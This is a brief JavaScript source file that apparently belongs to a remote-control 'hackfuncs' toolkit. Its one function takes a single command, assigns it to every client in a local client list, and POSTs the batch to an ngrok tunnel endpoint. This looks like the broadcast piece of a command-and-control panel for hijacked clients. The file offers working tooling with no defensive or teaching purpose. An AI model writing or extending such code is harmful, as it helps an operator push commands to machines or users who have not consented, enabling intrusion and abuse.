export async function sendGlobalCommand(command) {
    const commandClientMap = {};

    window.hackfuncs.localClientsList.forEach((client) => {
        const clientId = client.client_id;
        commandClientMap[clientId] = { command: command };
    });

    console.log("Prepared data to send:", JSON.stringify(commandClientMap, null, 2));

    try {
        const response = await fetch(
            "https://flexible-elk-monthly.ngrok-free.app/submit",
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(commandClientMap),
            }
        );

        if (response.ok) {
            const data = await response.json();
            console.log("Global command sent:", data);
            console.log("Received data:", JSON.stringify(data, null, 2)); // Formatear JSON
        } else {
            console.error("Error sending global command:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error sending global command:", error);
    }
}


window.hackfuncs.sendGlobalCommand = sendGlobalCommand